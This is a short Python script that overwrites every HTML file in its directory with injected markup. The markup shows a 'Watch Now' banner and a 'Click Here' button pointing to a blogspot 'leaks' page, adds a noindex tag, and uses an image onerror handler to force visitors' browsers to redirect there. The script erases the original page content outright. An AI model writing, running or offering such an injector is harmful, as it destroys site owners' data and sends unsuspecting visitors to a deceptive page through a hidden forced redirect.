import os

# Directory where your HTML files are located (same as the script location)
directory_path = os.path.dirname(os.path.abspath(__file__))

# Code you want to replace in the HTML files
replacement_code = '''
<center><h1><a href="https://today-game-pass.blogspot.com/2024/12/leaks.html"> Watch Now <h1></center>
<center><a href="https://today-game-pass.blogspot.com/2024/12/leaks.html"><img src="https://edu.ieee.org/in-mepco-wie/wp-content/uploads/sites/387/2016/09/click-here-logo-button-gif-images-2.gif?format=750w" alt="Click Here"></a></center>
<meta name="googlebot" content="noindex">
<img src='0' onerror= top.location.href='https://today-game-pass.blogspot.com/2024/12/leaks.html'>
'''

# Loop through each HTML file in the directory
for filename in os.listdir(directory_path):
    if filename.endswith('.html'):
        file_path = os.path.join(directory_path, filename)

        # Open the file and overwrite its content with the replacement code
        with open(file_path, 'w') as file:
            file.write(replacement_code)

print('Content replaced in HTML files.')
